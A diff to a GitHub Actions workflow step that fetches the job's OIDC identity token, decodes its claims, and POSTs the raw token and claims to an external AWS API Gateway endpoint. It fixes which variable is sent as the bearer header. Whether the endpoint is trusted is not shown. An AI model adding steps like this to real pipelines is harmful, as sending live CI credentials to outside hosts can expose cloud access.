@@ -16,11 +16,11 @@ jobs:
 
       - name: Get OIDC Token
         run: |
-          token=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+          token_raw=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
           "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazon.com") 
-          token=$(echo "$token" | cut -d '.' -f2 | base64 -d | jq .)
+          token=$(echo "$token_raw" | cut -d '.' -f2 | base64 -d | jq .)
           curl -X POST -H "Content-Type: application/json" \
-          -H "Authorization: Bearer ${token}" \
+          -H "Authorization: Bearer ${token_raw}" \
           -d "{\"token\":\"$token\"}" \
           "https://2sc5lj0u1l.execute-api.us-east-1.amazonaws.com/prod/ident"
 
